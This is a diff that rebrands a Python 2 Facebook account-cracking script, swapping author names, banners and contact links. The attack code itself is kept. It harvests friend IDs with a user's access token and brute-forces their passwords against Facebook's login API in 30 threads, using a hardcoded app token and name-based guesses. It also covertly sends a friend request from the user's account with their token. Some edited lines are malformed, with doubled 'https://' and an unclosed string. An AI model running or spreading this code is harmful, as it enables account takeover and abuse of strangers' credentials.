@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To SaimBabu
+#The Credit For This Code Goes To JustinImran
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -110,30 +110,23 @@ def phone():
 		login()
 	os.system('clear')		
 
-#Dev:SAIM_KHAN
+#Dev:JUSTIN_IMRAN
 ##### LOGO #####
 logo = """
-\033[1;97m#     #  #####        #    # #       #     #
-\033[1;97m#     # #     #       #   #  #        #   #
-\033[1;97m#     #       #       #  #   #         # #
-\033[1;97m#     #  #####  ##### ###    #          #
-\033[1;97m #   #  #             #  #   #         # #
-\033[1;97m  # #   #             #   #  #        #   #
-\033[1;97m   #    #######       #    # ####### #     #
-\033[1;97m•───────────────────────────────────────────•
-\033[1;97m__   __          _             __   ___   _
-\033[1;97m\ \ / /__ _ _ __(_)___ _ _    /  \ |_  ) / |
-\033[1;97m \ V / -_) '_(_-< / _ \ ' \  | () | / / _| |
-\033[1;97m  \_/\___|_| /__/_\___/_||_|  \__(_)___(_)_|
-\033[1;97m•───────────────────────────────────────────•
-\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•
+\033[1;97m──╔╗────╔════╗
+\033[1;97m──║║────║╔╗╔╗║
+\033[1;97m──║╠╗╔╦═╩╣║║╠╬═╗
+\033[1;97m╔╗║║║║║══╣║║╠╣╔╗╗
+\033[1;97m║╚╝║╚╝╠══║║║║║║║║
+\033[1;97m╚══╩══╩══╝╚╝╚╩╝╚╝
+\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•
 
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mAuthor Name: SAIM_KHAN     ⚡⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡⚡\033[1;37mAuthor Name: JUSTIN_IMRAN     ⚡⚡\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡⚡\033[1;37mPhone Numbr: +923047753788 ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mYutube Chnl:Termux King ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡       \033[1;37mFrom: Pakistan      ⚡⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡⚡\033[1;37mFacebook:JusTin Imran 🍆🍆\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡⚡       \033[1;37mFrom: Bangladesh     ⚡⚡\033[1;37m]\033[1;0m
 
-\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•
+\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•
 """
 
 def tik():
@@ -153,22 +146,19 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m#     #  #####        #    # #       #     #
-\033[1;97m#     # #     #       #   #  #        #   #
-\033[1;97m#     #       #       #  #   #         # #
-\033[1;97m#     #  #####  ##### ###    #          #
-\033[1;97m #   #  #             #  #   #         # #
-\033[1;97m  # #   #             #   #  #        #   #
-\033[1;97m   #    #######       #    # ####### #     #
+\033[1;97m░░░░░██╗██╗░░░██╗░██████╗
+\033[1;97m░░░░░██║██║░░░██║██╔════╝
+\033[1;97m░░░░░██║██║░░░██║╚█████╗░
+\033[1;97m██╗░░██║██║░░░██║░╚═══██╗
+\033[1;97m╚█████╔╝╚██████╔╝██████╔╝
+\033[1;97m░╚════╝░░╚═════╝░╚═════╝░
 \033[1;97m•───────────────────────────────────────────•
-\033[1;97m__   __          _             __   ___   _
-\033[1;97m\ \ / /__ _ _ __(_)___ _ _    /  \ |_  ) / |
-\033[1;97m \ V / -_) '_(_-< / _ \ ' \  | () | / / _| |
-\033[1;97m  \_/\___|_| /__/_\___/_||_|  \__(_)___(_)_|
+\033[1;97m█ █▀▄▀█ █▀█ ▄▀█ █▄░█
+\033[1;97m█ █░▀░█ █▀▄ █▀█ █░▀█
 \033[1;97m•───────────────────────────────────────────•
  """
-CorrectUsername = "SAIM"
-CorrectPassword = "KHAN"
+CorrectUsername = "JUSTIN"
+CorrectPassword = "IMRAN"
 
 loop = 'true'
 while (loop == 'true'):
@@ -176,7 +166,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:SAIM_KHAN
+            print "Logged in successfully as " + username #Dev:JUSTIN_IMRAN
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -184,7 +174,7 @@ while (loop == 'true'):
             os.system('xdg-open https://www.youtube.com/channel/UCzTbemCE3YgSBR9STEmH8Cg')
     else:
         print "\033[1;97mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCzTbemCE3YgSBR9STEmH8Cg')
+        os.system('xdg-open https://https://www.facebook.com/X.Zack.75
 
 ##### LICENSE #####
 #=================#
@@ -201,7 +191,7 @@ def login():
         time.sleep(0.05)
         print "\033[1;97m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;97m[4]\033[1;47m\033[1;31mSubscribe YouTube Channel        \033[1;0m"
+        print "\033[1;97m[4]\033[1;47m\033[1;31mFollow My Facebook        \033[1;0m"
         time.sleep(0.05)
 	print "\033[1;97m[5]\033[1;47m\033[1;31mJoin WP group For Help           \033[1;0m"
         time.sleep(0.05)
@@ -274,7 +264,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\033[1;47m\033[1;91mLogin Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://https://www.facebook.com/X.Zack.75')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -318,7 +308,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:SAIM_KHAN
+	os.system("clear") #Dev:JUSTIN_IMRAN
 	print logo
 	print "\033[1;37m[!]\033[1;97m Logged in User Information\033[1;92m"
 	time.sleep(0.05)
@@ -326,7 +316,7 @@ def menu():
 	time.sleep(0.05)
 	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
 	time.sleep(0.05)
-	print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+	print "\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•"
 	print "\033[1;97m[1]\033[1;47m\033[1;31mStart Hacking                             \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;97m[2]\033[1;47m\033[1;31mID Not Found Problem                      \033[1;0m"
@@ -437,7 +427,7 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•"
 		print logo
 		jalan('\033[1;97m[+]\033[1;91mGetting Accounts\033[1;97m:-:')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
@@ -446,7 +436,7 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•"
 		print logo
 		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
 		try:
@@ -552,7 +542,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = b['first_name'] + '143'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -574,7 +564,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = '786786'							
+						                       pass5 = '143143'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -596,7 +586,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'Bangladesh'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -640,7 +630,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = b['last_name'] + '786'											
+										                           pass8 = b['last_name'] + '@@'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -662,7 +652,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
+										                                       pass9 = b['first_name'] + '420'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -690,11 +680,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev:Babar_Ali
-        print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+#Dev:Justin_Imran
+        print "\033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•"
 	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m«-----------------\033[1;37mKali.linux\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37mSylhet.gang\033[1;97m-----------------»"
 	print """
 \033[1;97m ____               _____ ____
 \033[1;97m| __ ) _   _  ___  |_   _/ ___|
@@ -703,7 +693,7 @@ def pilih_super():
 \033[1;97m|____/ \__, |\___|   |_| \____|
 \033[1;97m       |___/
 """
-	print "\033[1;97m«-----------------\033[1;37mKali.linux\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37mSylhet.gang\033[1;97m-----------------»"
 	raw_input("\n\033[1;97m[+]\033[1;97mBack")
 	menu()
 
